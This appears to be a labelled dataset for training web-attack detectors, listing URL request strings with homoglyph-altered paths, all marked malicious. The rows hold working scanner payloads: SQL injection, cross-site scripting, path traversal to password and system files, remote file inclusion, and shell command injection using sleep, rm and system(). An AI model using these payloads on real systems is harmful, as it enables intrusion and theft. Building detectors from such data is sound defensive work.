sentences 	 labels
/ 𝚜𝓉ring / strings / parameters = 1 or  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 8113 = 8113 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  --  viti  	 1
/ ℮n-ꭎs / s7qus4g3 . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝑠𝓉ring / strings / parameters = 1 '  ,  ( select  *  from generate_series ( 5609 , 5609 , case when  ( 5609 = 5609 )  then 1 else 0 end )  limit 1 )  	 1
/ ƽ𝐭ring / strings / parameters = echo lbgscb $  (  ( 75 + 53 )  )  $  ( echo lbgscb ) lbgscb &  	 1
/ 𝙨𝙩ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo fagbbn )   &  &  str1 =  $  {  # str }   &  &   [  1 -eq  $  { str1 }   ]   &  &  sleep 1  |  	 1
/ 𝘳𝙚ad / search / results ? words = nessus "  >  < script > alert (  ' listmanager_words_xss . nasl '  )  <  / script >  	 1
/ 𝒔𝒕ring / strings / parameters = 1 and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  	 1
/ 𝗌𝖈ripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1331908691 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  	 1
/ 𑣁𝘵ring / strings / parameters = |   [  6 -ne  $  ( echo tkxzex  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  /  /  	 1
/ 𝗌𝖙ring / str =  $  ( echo ycsciw )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 1
/ 𝓈ϲripts / index . php ? p =  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \ boot . ini \ x00  	 1
/ Ꮒ𝘦lp . php ? q =  " del \ x09q83132484 & rem \ x09  	 1
/ 𝘴ⅽripts / news . scr . php ? globals [ pth ]  [ classes ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ?  ?  	 1
/ 𝓈𝘵ring / strings / parameters = 1 "  "  and 6240 =  (  ' qqpjq '  |  |  ( select case 6240 when 6240 then 1 else 0 end from rdb $ database )  |  |  ' qzvzq '  )  	 1
/ 𝕤𝐭ring / strings / parameters = 1 %  "  "  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  "  "  %  "  "  =  "  "  	 1
/ 𝘩𝙚lp . php ? q = ping ; -w ; 8000 ; -n ; 1 ; 1 . 2 . 3 . 4 & rem ;  	 1
/ ѕ𝙩ring / strings / parameters = 1 '  ,  ( select  ( case when  ( 6560 = 2813 )  then 1 else cast ( 1 as int )  /  ( select 0 from dual )  end )  from dual )  	 1
/ ѕ𝑡ring / strings / parameters = & echo $ ifsutudjc $  (  ( 16 + 78 )  )  $  ( echo $ ifsutudjc ) utudjc /  /  	 1
/  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  /  .  .  /  { file }  	 1
/ ꜱ𝒕ring / strings / parameters = &  sleep 0  &  &  str =  $  ( echo kigxdw )   &  &  str1 =  $  {  # str }   &  &   [  7 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 1
/ 𝒻𝖎les / message-forward . php3 ? bsx_libdir = xxpathxx  	 1
/ еn-𝔲s / account / backend / classes . php ? include_path =  .  .  / lib / jinzora . js \ x00  	 1
/ ѕ𝓉ring / strings / parameters = 1 '  )  )  )  union all select null , null --  	 1
/ 𝗰𝓰i-bin / quickstore . cgi ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00html & cart_id =  	 1
/ 𝖕o𝐩up . php ? poll_ident =  < script > alert (  " wvs-xss-magic-string-411445575285 "  )  <  / script >  	 1
/ 𝗌𝓽ring / strings / parameters = &  # 34 ;  &  # 62 ;  < h1 / onmouseover =  '  \ u0061lert ( 1 )  '  >  	 1
/ 𝓈𝓽ring / strings / parameters = -3794 '  )  union all select 2485 , 2485 , 2485 , 2485 , 2485 --  	 1
/ 𝗌𝑡ring / strings / parameters = |   [  9 -ne  $  ( echo nykvkx  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ 𝘸𝚎q93ppb . php ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𑣁𝕥ring / strings / parameters = 1 %  "  "  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  	 1
/ 𐑈𝕥ring / strings / parameters = 1 )  )  as nwyh where 7100 = 7100 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  	 1
/ 𝘂𝖘r / extensions / get_calendar . inc . php ? root_path = xxpathxx  	 1
/ 𝚌𝐠is / pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ z𝓊𝐢hld5m . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝒔𝓉ring / strings / parameters = -4557 or 6872 = 6872 --  kkte  	 1
/ 𝚎n-𝒖s / hipkz026 . idc ?  < script > document . cookie =  " testyrbs = 2855 ;  "  <  / script >  	 1
/ 𝒔𝑡ring / strings / parameters = 1 "  "  )  as gdcx where 2335 = 2335 and 6969 =  ( select 6969 from pg_sleep ( 5 )  )  --  	 1
/ j𝐚∨ascript / pm . exe  	 1
/ 𝐡𝓮lp . php ? q =  ; rm \ x09q81281166 \ x09 #  	 1
/ 𝖘𝗍ring / strings / parameters = < script src =  " http :  &  # 47 ;  &  # 47 ; xss . rocks / xss . jpg "  >  <  / script >  	 1
/ 𝒔𝓉ring / strings / parameters = 1 %  '  and 7366 = 9197 #  	 1
/ ꭈ𝗉xyx07v . asp ?  < script > document . cookie =  " testbnli = 1975 ;  "  <  / script >  	 1
/ 𝚜𝒕ring / strings / parameters = 1 %  '  )  )  ; begin user_lock . sleep ( 5 )  ;  end and  (  (  '  %  '  =  '  	 1
/ 𝒑𝘩pmyadmin / webappmon . exe ? ins = nowait & act = natping & sel =  " 255 . 255 . 255 . 255  &  id &  "  	 1
/ ɩn𝖽ex . php / 1 '  	 1
/ 𝕤𝑡ring / strings / parameters = 1 )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  ( 5099 = 5099  	 1
/ ҽԁv3mapy . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ гꝪle3om5 . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝑠𝒕ring / strings / parameters = -1059 "  "  )  union all select 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 , 1276 #  	 1
/ ꓒ𝟳ktpmcq . nsf ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ ⅇ𝔁amples / jsp / colors / search . php ? allwords =  < br >  < script > foo <  / script >  & cid = 0 & title = 1 & desc = 1  	 1
/ 𝐩𝒽pmyadmin / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1358744507 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 1
/ 𝕤𝓽ring / strings / parameters = % oa ping -n 30 127 . 0 . 0 . 1  	 1
/ o𝗂𝑒504mr . dll ?  < script > document . cookie =  " testtpby = 7052 ;  "  <  / script >  	 1
/ 𝘩𝑒lp . php ? q =  "  & rm \ xa0q59981564 & rem \ xa0  	 1
/ ƽ𝕥ring / strings / parameters = -4108 '  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  ' tqjx '  =  ' tqjx  	 1
/ 𝒔𝙩ring / strings / parameters = |   [  9 -ne  $  ( echo wxfpfo  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  	 1
/ 𝐬𝓉ring / strings / parameters = 1 '  )  )  )  ; select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 and  (  (  (  ' ctbs '  like  ' ctbs  	 1
/ 𝚙𝘩pmyadmin / documentation . html ? phpmyadmin =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝗌𝚝ring / strings / parameters = 1 %  '  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 and  (  '  %  '  =  '  	 1
/ Ƽ𝗊nlm5z2 . jsp ?  < meta http-equiv = set-cookie content =  " testsixi = 8451 "  >  	 1
/ 𝙨𝒕ring / strings / parameters = select  *  from information_schema . tables --  	 1
/ ƽ𝓉ring / modo = insertar & precio = 1885 +  & b1 = pasar + por + caja  	 1
/ 𝗌𝙩ring / strings / parameters = '   str =  $  ( echo giprgx )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  	 1
/ 𝒻o𝔯um1_professionnel . asp ? n = 1771 & amp ; nn = 100 & amp ; page = c :  \ boot . ini  	 1
/ m𝑎ɩn . php ? logout =  '  \ x0arm \ x09q55586739 \ x09 #  	 1
/ 𝕤𝒕ring / strings / parameters = 1 "  "  )  as kuuf where 6908 = 6908 ; if ( 7899 = 7899 )  select 7899 else drop function zbbp --  	 1
/ 𝗌𝗍ring / strings / parameters = 1 )  )  as krzi where 8727 = 8727 or 8315 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  	 1
/ 𝚜𝚝ring / strings / parameters = |  | echo ovbfoe $  (  ( 46 + 36 )  )  $  ( echo ovbfoe ) ovbfoe &  	 1
/ 𝔰𝘵ring / strings / parameters = "  | echo $ ifsytbsts $  (  ( 24 + 38 )  )  $  ( echo $ ifsytbsts ) ytbsts |  	 1
/ ѕ𝚝ring / modoa = registro & login = puglia & password = ente + 6a7 & nombre = serveriana & apellidos = santander + bohorquez & email = rundle4 @ eurograb . ma & dni = 09116322l & direccion = calle + trebedes + 157 ,  +  & ciudad = fasnia & cp = 02270 & provincia = ciudad + real & ntc = 1078977887269273 & b1 = registrar  	 1
/ 𝘀𝕥ring / strings / parameters = ;  str =  $  ( echo msptmx )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 1
/ 𝗌𝖙ring / modo = entrar & login = rocio4 & pwd = acrecenta ! dora & remember = onany ?   set-cookie :  + tamper = 1041264011025374727 & b1 = entrar  	 1
/ j𝕒𝖛ascript /  . passwd . o  	 1
/ 𝓼𝑡ring / strings / parameters = 1 ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  #  huhw  	 1
/ 𝘴𝗍ring / strings / parameters = 1 '  |  |  ( select  ' kbvq '  where 9279 = 9279 and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  )  |  |  '  	 1
/ ꜱ𝘵ring / strings / parameters = &  & echo ncexjg $  (  ( 72 + 12 )  )  $  ( echo ncexjg ) ncexjg /  /  	 1
/ 𝖘𝗍ring / strings / parameters = ; echo $ ifsxltpvn $  (  ( 45 + 86 )  )  $  ( echo $ ifsxltpvn ) xltpvn \  	 1
/ 𝓮𝓍amples / jsp / checkbox / index . php ? cat_select =  < script > foo <  / script >  	 1
/ j𝖆𝓋ascript / 2004 . exe  	 1
/ 𝘴𝓉ring / strings / parameters = -6095 '  )  or 6872 = 6872 and  (  ' bfwm '  like  ' bfwm  	 1
/ 𑣁𝔱ring / strings / parameters = & lt ; script src =  /  / xss . rocks /  . j >  	 1
/ 𝗌𝘁ring / strings / parameters = < svg onclick = popup = 1 ;  >  	 1
/ 𝘀𝒕ring / strings / parameters = '   str =  $  ( echo jkjfeg )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 1
/ 𝖘𝘵ring / strings / parameters = '   str =  $  ( echo paacld )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  '  	 1
/ 𝘤𝒽ildren ' s /  	 1
/ 𝓼𝒕ring / strings / parameters = |  | echo ihelyg $  (  ( 76 + 62 )  )  $  ( echo ihelyg ) ihelyg &  	 1
/ mooⅾl𝔢 / filter / tex / texed . php ? formdata = foo & pathname = foo "  +  |  |  + echo + db + 6f + 61 + 64 + 4c + 69 + 62 + 72 + 61 + 72 + 79 + 41 + 00 + 00 + 00 + 00 + 47 + 65 + 74 + 50 + 72 + 6f + 63 + 41 + 64 + 64 +  +  >  > ctdn  	 1
/ j𝘢𝖛ascript / sessions . exe  	 1
/ 𝗌𝘤ripts / mlog . html ? screen =  / etc / passwd  	 1
/ 𝟽ꭎ1pb2xi . nsf ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  / script >  	 1
/ 𝘴𝓉ring / strings / parameters = ;  str =  $  ( echo hdixth )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ 𝑠𝑡ring / strings / parameters = 1 '  )  order by 1 --  	 1
/ 𐐽𝘨i-bin / contrib / forms / evaluation / c_formevaluation . class . php ? fileroot =  / etc / passwd \ x00  	 1
/ Ꮟl𝟴sefdm . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ m𝖆ꭵn . php ? stuff =  "  & ver \ x09 > q95961944 & rem \ x09  	 1
/ ѕ𝘵ring / strings / parameters = '  waitfor delay  ' 0 : 0 : 20 '   --  	 1
/ ƽ𝔱ring / strings / parameters = '  ) print (  ` echo ehpkwp \ necho  $  (  ( 79 + 86 )  )  \ necho ehpkwp \ necho ehpkwp `  )  ;  /  / ehpkwp  	 1
/ 𝚜𝐭ring / strings / parameters = 1 "  "  where 8672 = 8672 union all select null , null #  	 1
/ 𝖘𝓽ring / strings / parameters = 1 "  "  )  as jiiq where 6847 = 6847 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  	 1
/ 𝐬𝖼ripts / kernel / loadkernel . php ? installpath =  / etc / passwd \ x00  	 1
/ jα𝘷ascript / surf . exe  	 1
/ 𝑠𝙩ring / strings / parameters = '  or  ' 1 '  =  ' 1 '  --  	 1
/ 𐑈𝘂pport / include / open_form . php ? include_dir = xxpathxx ? cmd = pwd  	 1
/ 𝒔𝐭ring / strings / parameters = 1 '  where 1272 = 1272 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  --  	 1
/ 𐑈𝒕ring / modo = registro & login = fitch & password = libres29 & nombre = aramis & apellidos = bellmunt + callealt & email = frigola @ lesionesmusculares . tv +  & dni = 56967582d & direccion = plza .  + celso + negueruela ,  + 113 ,  +  & ciudad = pajares + de + los + oteros & cp = 18370 & provincia = lava & ntc = 6708069843609931 & b1 = registrar  	 1
/ 𝘧𝐜gi-bin / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝕤𝓽ring / strings / parameters = "  echo bzqfls $  (  ( 30 + 41 )  )  $  ( echo bzqfls ) bzqfls "  	 1
/ 𝒔𝒕ring / strings / parameters = '  ;  str =  $  ( echo zepyms )  ;  str1 =  $  {  # str }  ;  if  [  8 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  	 1
/ 𝖊𑣖rx3ya4 . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝕩oo𝒑s232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  '  /  .  / tmp / rymojltfjq0 +  >  +  / dev / null +  &  '  )  ;  function v  	 1
/ 𝘀𝔱ring / strings / parameters = 1 %  "  "  waitfor delay  ' 0 : 0 : 5 '  --  	 1
/ 𝗌𝕥ring / strings / parameters = 1 %  "  "  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  "  "  %  "  "  =  "  "  	 1
/ 𝔰𝐭ring / strings / parameters = 1 %  '  )  )  )  and 3715 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  (  (  '  %  '  =  '  	 1
/ ᎥnᏧex . php ? errcode =  < script > alert (  " 413375588092 "  )  ;  <  / script >  	 1
/ 𝐬𝗍ring / strings / parameters = 1 '  +  ( select pagd where 2484 = 2484 ; select  ( case when  ( 3855 = 3855 )  then 3855 else 1 /  ( select 0 )  end )  --  	 1
/ 𝙨ƽi / envout . bat ?  | dir  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  	 1
/ 𝓈𝚝ring / strings / parameters = ftp :  /  / 192 . 168 . 24 . 203 /  *  < apache_mod_proxy_ftp_glob_xss . nasl >  	 1
/ Ꮒ𝕖lp . php ? q =  '  \ x0adel q56533456  #  	 1
/ ᶃỿ23xnjq . jsp ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝐬𝓽ring / strings / parameters = <  !  >  <  !  --  --  >  <  ?  >  <  /  >  	 1
/ 𝑡o𝖕 . php ? stuff =  '  ; uname  > q56884429  #  	 1
/ 𝚜𝓽ring / modo = registro & login = dongmoon & password = setentavo & nombre = naiara & apellidos = ballester + alumbreo & email = demjanenko @ gesautonomos . io & dni = 56050614m & direccion = c /  + colon + 123 ,  + 6 ? c & ciudad = cantalapiedra & cp = 43143 & provincia = lugo & ntca = 6967344603029050 & b1 = registrar  	 1
/ ρl𝑢gins / spamx / editheader . admin . class . php ? _conf [ path ]  = xxpathxx  	 1
/ 𝓻𝔢cordings / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1161314398 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 1
/ 𝕤𝗍ring / strings / parameters = |   [  2 -ne  $  ( echo oiyjxa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ ⅇ𝕩amples / jsp / sessions / include / theme . inc . php ? fullpath =  / etc / passwd \ x00  	 1
/ 𑣁𝚝ring / strings / parameters = 1 "  "  )  )  )  and  ( 3020 = 3020 )  * 6703 and  (  (  (  "  " krxy "  "  =  "  " krxy  	 1
/ 𝒾𝈒prbs22 . php ?  < script > document . cookie =  " testjnre = 7328 ;  "  <  / script >  	 1
/ 𝕔ɡi-bin / openview5 . exe ? target = main & action =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / windows / win . ini  	 1
/ 𝓼𝑡ring / strings / parameters = echo ymgfhg $  (  ( 56 + 20 )  )  $  ( echo ymgfhg ) ymgfhg &  	 1
/  ⁰ uff0e % uff0e \  % uff0e % uff0e \  { file }  	 1
/ 𝘴𝕥ring / strings / parameters = 1 '  )  )  or char ( 119 )  |  | char ( 100 )  |  | char ( 99 )  |  | char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 )  , 0 )  , 5000000000 )  , null )  --  	 1
/ ℮𝚡amples / jsp / cal / awstatstotals . php ? sort =  "  ]  . phpinfo (  )  . exit (  )  .  $ a [  "  	 1
/ 𝘁oρ . php ? stuff =  "  & rm q91375949 & rem  	 1
/ 𝖘𝘵ring / strings / parameters = 1 where 6383 = 6383 or elt ( 6272 = 6272 , sleep ( 5 )  )  --  	 1
/ m𝐚𝒾n . php ? logout =  "  \ x0asleep \ x0911 \ x09 #  	 1
/ ɑсcountlogon . cfm ? rtn = 1 "  >  < script > alert (  " 411735577546 "  )  ;  <  / script >  <  " 234  	 1
/ m𝒶ⅈn . php ? logout =  '  & uname  #  	 1
/ 𝙨𝔱ring / modo = insertar & precio = 5289 & b1 = pasar + por + caja '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  	 1
/ ୨ko𝟲m4c8 . cfc ?  < meta http-equiv = set-cookie content =  " testylik = 3403 "  >  	 1
/ m𝒶ⅈn . php ? logout =  '  \ x0auname \ x09 #  	 1
/ 𝗌𝑐s86g1p . pl ?  < meta http-equiv = set-cookie content =  " testquyx = 2820 "  >  	 1
/ ℯ𝓍amples / servlets / servlet / way-board / way-board . cgi ? db =  / etc / passwd \ x00  	 1
/ ҽ𝔁amples / jsp / cal / index . php ? search =  < script > foo <  / script >  	 1
/ 𝖊𝗑amples / jsp / jsp2 / jspx / user . cgi ? url =  "  >  < script > alert (  " gossamer_links_url_xss . nasl "  )  ;  <  / script >  & from = add  	 1
